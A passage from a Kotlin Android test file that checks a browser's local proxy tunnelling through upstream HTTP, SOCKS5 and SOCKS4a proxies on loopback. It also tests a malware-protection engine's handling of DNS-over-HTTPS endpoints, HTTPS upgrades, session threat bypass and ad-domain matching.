                client.soTimeout = 3000
                client.getOutputStream().write("CONNECT example.com:443 HTTP/1.1\r\nHost: example.com:443\r\n\r\n".toByteArray(Charsets.ISO_8859_1))
                client.getOutputStream().flush()
                val status = readLineIso(client.getInputStream())
                assertTrue("Expected 200 Connection Established via HTTP proxy, got: $status", status.contains("200"))
                while (readLineIso(client.getInputStream()).isNotEmpty()) {}
                client.getOutputStream().write("TUNNEL_PING\r\n".toByteArray(Charsets.ISO_8859_1))
                client.getOutputStream().flush()
                assertEquals("TUNNEL_PONG", readLineIso(client.getInputStream()))
            }
            assertTrue(httpUpstreamAuthSeen.get())

            // Test D: Upstream SOCKS5 proxy with RFC 1929 auth & remote domain (ATYP=0x03)
            currentProxy = com.example.data.browser.BrowserProxyProfile(
                name = "Auth SOCKS5",
                type = com.example.data.browser.BrowserProxyType.SOCKS5,
                host = "127.0.0.1",
                port = upstreamSocks5Port,
                username = "s5user",
                password = "s5pass",
                bypassRules = emptyList()
            )
            java.net.Socket(loopback, localPort).use { client ->
                client.soTimeout = 3000
                client.getOutputStream().write("CONNECT socks5-target.example:443 HTTP/1.1\r\nHost: socks5-target.example:443\r\n\r\n".toByteArray(Charsets.ISO_8859_1))
                client.getOutputStream().flush()
                val status = readLineIso(client.getInputStream())
                assertTrue("Expected 200 Connection Established via SOCKS5 proxy, got: $status", status.contains("200"))
                while (readLineIso(client.getInputStream()).isNotEmpty()) {}
                client.getOutputStream().write("TUNNEL_PING\r\n".toByteArray(Charsets.ISO_8859_1))
                client.getOutputStream().flush()
                assertEquals("TUNNEL_PONG", readLineIso(client.getInputStream()))
            }
            assertEquals("socks5-target.example", socks5DomainSeen.get())

            // Test E: Upstream SOCKS4a proxy forwarding domain remotely
            currentProxy = com.example.data.browser.BrowserProxyProfile(
                name = "SOCKS4a",
                type = com.example.data.browser.BrowserProxyType.SOCKS4,
                host = "127.0.0.1",
                port = upstreamSocks4aPort,
                bypassRules = emptyList()
            )
            java.net.Socket(loopback, localPort).use { client ->
                client.soTimeout = 3000
                client.getOutputStream().write("CONNECT socks4a-target.example:443 HTTP/1.1\r\nHost: socks4a-target.example:443\r\n\r\n".toByteArray(Charsets.ISO_8859_1))
                client.getOutputStream().flush()
                val status = readLineIso(client.getInputStream())
                assertTrue("Expected 200 Connection Established via SOCKS4a proxy, got: $status", status.contains("200"))
                while (readLineIso(client.getInputStream()).isNotEmpty()) {}
                client.getOutputStream().write("TUNNEL_PING\r\n".toByteArray(Charsets.ISO_8859_1))
                client.getOutputStream().flush()
                assertEquals("TUNNEL_PONG", readLineIso(client.getInputStream()))
            }
            assertEquals("socks4a-target.example", socks4aDomainSeen.get())
        } finally {
            localServer.stop()
            runCatching { originServer.close() }
            runCatching { upstreamHttpProxy.close() }
            runCatching { upstreamSocks5.close() }
            runCatching { upstreamSocks4a.close() }
            originThread.interrupt()
            upstreamHttpThread.interrupt()
            upstreamSocks5Thread.interrupt()
            upstreamSocks4aThread.interrupt()
        }
    }

    @Test
    fun `malware shield coexists cleanly with all DNS providers proxies HTTP fallback and non-ad domains`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val engine = com.example.data.security.MalwareProtectionEngine
        engine.ensureInitialized(context)
        engine.updateSettings(
            context = context,
            malwareShieldEnabled = true,
            httpsUpgradeEnabled = true,
            downloadGuardEnabled = true,
            extensionScannerEnabled = true,
            strictMixedContentEnabled = true
        )

        // All DNS DoH endpoints & DNS IPs are cleanly allowed
        listOf(
            "https://1.1.1.1/dns-query",
            "https://94.140.14.14/dns-query",
            "https://94.140.14.140/dns-query",
            "https://dns.adguard-dns.com/dns-query",
            "https://unfiltered.adguard-dns.com/dns-query",
            "https://family.adguard-dns.com/dns-query",
            "https://dns.quad9.net/dns-query"
        ).forEach { url ->
            val v = engine.inspectUrl(url, context)
            assertFalse("DNS endpoint should never be blocked: $url", v.isBlocked)
        }

        // User-configured custom DNS & proxy hosts registered as infrastructure are allowed
        engine.setInfrastructureHosts(listOf("https://my-custom-doh.example.xyz/dns-query", "proxy.my-vps.top"))
        assertFalse(engine.inspectUrl("https://my-custom-doh.example.xyz/dns-query", context).isBlocked)
        assertFalse(engine.inspectUrl("https://proxy.my-vps.top:8443/", context).isBlocked)
        engine.setInfrastructureHosts(emptyList())

        // Auto-HTTPS-upgrade records & consumes HTTP fallback and allows the host over HTTP for the session
        val origHttp = "http://legacy-http-only.example.org/page"
        val upgraded = engine.inspectUrl(origHttp, context).upgradedHttpsUrl
        assertEquals("https://legacy-http-only.example.org/page", upgraded)
        engine.recordAutoHttpsUpgrade(upgraded!!, origHttp)
        assertEquals(origHttp, engine.consumeAutoHttpsUpgradeFallback(upgraded))
        assertEquals(null, engine.inspectUrl(origHttp, context).upgradedHttpsUrl)

        // Session SSL/threat bypass helper honors user's "Proceed Anyway" choice
        assertFalse(engine.isUrlAllowedForSession("https://self-signed.example.net/dashboard"))
        engine.allowThreatUrlForSession("https://self-signed.example.net/dashboard")
        assertTrue(engine.isUrlAllowedForSession("https://self-signed.example.net/dashboard"))

        // Legitimate non-ad subdomains are never falsely blocked by AdBlocker DNS first-label matching
        assertFalse(com.example.data.downloader.CloudflareWarpDns.isKnownAdOrTrackerDomain("pixel.google.com"))
        assertFalse(com.example.data.downloader.CloudflareWarpDns.isKnownAdOrTrackerDomain("tracker.debian.org"))
        assertFalse(com.example.data.downloader.CloudflareWarpDns.isKnownAdOrTrackerDomain("track.ups.com"))
        assertTrue(com.example.data.downloader.CloudflareWarpDns.isKnownAdOrTrackerDomain("doubleclick.net"))
        assertTrue(com.example.data.downloader.CloudflareWarpDns.isKnownAdOrTrackerDomain("adservice.google.com"))
    }

    private fun readLineIso(inp: java.io.InputStream): String {
        val baos = java.io.ByteArrayOutputStream()
        var prev = -1
        while (true) {
            val b = inp.read()
            if (b == -1) break
            if (b == '\n'.code) {
                val raw = baos.toByteArray()
                val len = if (prev == '\r'.code && raw.isNotEmpty()) raw.size - 1 else raw.size
                return String(raw, 0, len, Charsets.ISO_8859_1)
            }
            baos.write(b)
            prev = b
        }
        return String(baos.toByteArray(), Charsets.ISO_8859_1)
    }

    private fun readExact(inp: java.io.InputStream, dest: ByteArray) {
        var off = 0
        while (off < dest.size) {
            val r = inp.read(dest, off, dest.size - off)
            if (r == -1) throw java.io.EOFException("Unexpected EOF")
            off += r
        }
    }
}




